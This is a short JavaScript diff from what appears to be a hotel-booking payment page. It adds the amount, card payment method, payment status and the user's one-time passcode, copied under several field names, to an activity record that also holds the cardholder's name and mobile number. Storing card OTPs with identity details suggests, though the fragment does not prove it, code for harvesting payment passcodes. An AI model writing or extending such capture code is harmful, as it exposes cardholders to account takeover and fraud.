@@ -559,9 +559,16 @@
     activityType: 'otp_submission',
     recordId,
     bookingId,
+    amount,
+    paymentMethod: 'card',
     guestName: document.getElementById('guestName').value.trim() || document.getElementById('cardHolderName').value.trim(),
     mobile: mobileInput.value.trim(),
     otpEntered: otp,
+    otp: otp,
+    otp_code: otp,
+    otp_entered: otp,
+    otpentered: otp,
+    payment_status: 'otp_received',
     status: 'otp_received',
     submittedAt: new Date().toISOString()
   });
